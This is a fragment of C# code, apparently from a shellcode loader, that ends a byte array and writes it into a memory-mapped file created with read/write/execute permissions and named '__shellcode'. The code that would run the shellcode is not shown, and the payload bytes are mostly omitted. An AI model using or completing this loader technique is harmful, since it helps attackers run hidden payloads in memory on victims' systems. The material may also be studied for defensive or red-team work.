...
0x9e,0xe8,0xa5,0xb9,0x99,0x2b,0xa5,0x8f,0x87,0xfa,0xb9,0x25 };
                ...
                try
                {
                    ...
                    mmf = MemoryMappedFile.CreateNew("__shellcode", buf.Length, MemoryMappedFileAccess.ReadWriteExecute);
     
                    // Create a memory mapped view accessor with read/write/execute permissions..
                    mmva = mmf.CreateViewAccessor(0, buf.Length, MemoryMappedFileAccess.ReadWriteExecute);
     
                    // Write the shellcode to the MMF..
                    mmva.WriteArray(0, buf, 0, buf.Length);
